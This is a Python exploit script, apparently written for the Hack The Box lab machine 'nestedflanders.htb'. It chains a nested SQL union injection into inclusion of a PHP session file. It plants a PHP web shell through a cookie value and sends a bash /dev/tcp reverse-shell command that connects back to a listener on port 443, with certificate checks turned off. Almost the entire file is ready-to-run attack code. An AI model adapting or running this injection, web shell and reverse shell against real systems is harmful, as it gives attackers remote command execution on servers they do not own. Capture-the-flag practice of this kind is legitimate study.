import requests 
import traceback
import argparse

def trigger_reverse_shell(lhost):
    """
    You must setup your listener on port 443
    """
    raw_url = f"https://www.nestedflanders.htb/index.php?shell=bash+-c+'bash+-i+>%26+/dev/tcp/{lhost}/443+0>%261'&id=587'+union+select+\"1'+union+select+'/var/lib/php/sessions/sess_pl73ec4nn3v9vuif9oan8pklq7'--+-\"--+-"
    
    cookies = {
        "PHPSESSID": "pl73ec4nn3v9vuif9oan8pklq7",
        "shell": "<?php system($_REQUEST['shell']); ?>"
    }
    session = requests.Session()
    
    try:
        print("[+] Sending the request...")
        print(f"[+] Raw URL: {raw_url}")
        print("[+] Request sent. Check your listener")
        
        req = requests.Request('GET', raw_url)
        prepped = session.prepare_request(req)
        
        prepped.prepare_cookies(cookies)
        
        r = session.send(prepped, verify=False)
        print("[+] Request URL sent:", prepped.url)
        print("[+] Response:")
        print(r.text)
    except Exception as e:
        print("[-] Failed to send the request: ", e)
        traceback.print_exc()

def main():
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    parser = argparse.ArgumentParser("Receive a Reverse Shell. You must listen on port 443")
    parser.add_argument("lhost", help="Listener IP address")
    args = parser.parse_args()

    trigger_reverse_shell(args.lhost)

if __name__ == "__main__":
    main()
